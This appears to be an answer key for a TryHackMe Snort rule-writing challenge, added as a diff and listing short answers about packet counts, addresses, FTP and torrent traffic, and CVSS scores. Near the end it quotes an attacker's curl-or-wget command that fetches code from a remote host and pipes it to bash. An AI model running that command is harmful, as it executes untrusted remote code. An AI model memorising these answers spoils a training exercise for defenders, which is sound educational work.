@@ -1,0 +1,117 @@
+Snort Challenge - The Basics
+https://tryhackme.com/room/snortchallenges1
+
+What is the number of detected packets?
+164
+
+What is the destination address of packet 63?
+216.239.59.99
+
+What is the ACK number of packet 64?
+0x2E6B5384
+
+What is the SEQ number of packet 62?
+0x36C21E28
+
+What is the TTL of packet 65?
+128
+
+What is the source IP of packet 65?
+145.254.160.237
+
+What is the source port of packet 65?
+3372
+
+What is the number of detected packets?
+307
+
+What is the FTP service name?
+Microsoft FTP Service
+
+What is the number of detected packets?
+41
+
+What is the number of detected packets?
+1
+
+What is the number of detected packets?
+42
+
+What is the number of detected packets?
+7
+
+Investigate the logs and identify the software name embedded in the packet.
+Adobe ImageReady
+
+Investigate the logs and identify the image format embedded in the packet.
+GIF89a
+
+What is the number of detected packets?
+2
+
+What is the name of the torrent application?
+bittorrent
+
+What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?
+application/x-bittorrent
+
+What is the hostname of the torrent metafile?
+tracker2.torrentbox.com
+
+What is the number of the detected packets?
+16
+
+What is the number of the detected packets?
+68
+
+What is the number of the detected packets?
+87
+
+What is the number of the detected packets?
+90
+
+What is the number of the detected packets?
+155
+
+What is the number of the detected packets?
+2
+
+What is the name of the required option:
+msg
+
+What is the number of detected packets?
+25154
+
+What is the number of detected packets?
+12
+
+What is the requested path?
+\\192.168.116.138\IPC$
+
+What is the CVSS v2 score of the MS17-010 vulnerability?
+9.3
+
+What is the number of detected packets?
+26
+
+How many rules were triggered?.
+4
+
+What are the first six digits of the triggered rule sids?
+210037
+
+What is the number of detected packets?
+41
+
+What is the name of the used encoding algorithm?
+Base64
+
+What is the IP ID of the corresponding packet?
+62808 
+
+What is the attacker's command?
+(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
+
+What is the CVSS v2 score of the Log4j vulnerability?
+9.3
+
